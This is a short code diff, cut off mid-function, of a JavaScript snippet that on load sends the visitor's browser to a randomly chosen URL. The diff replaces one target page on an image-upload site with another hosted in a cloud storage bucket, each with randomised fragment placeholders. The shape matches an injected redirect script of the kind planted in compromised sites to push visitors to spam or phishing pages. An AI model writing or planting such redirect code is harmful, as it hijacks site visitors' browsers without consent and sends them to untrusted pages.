@@ -1,5 +1,5 @@
 var urls=[
-' http://imgupload.youboy.com/imagestore202406134ad15ad2-1d3c-4fd7-b225-324aee9c7870.html#{nnnnnnn}{wwww}',
+' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/d65d9cbc36cc483b963e147ea77ec8c9.htm#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
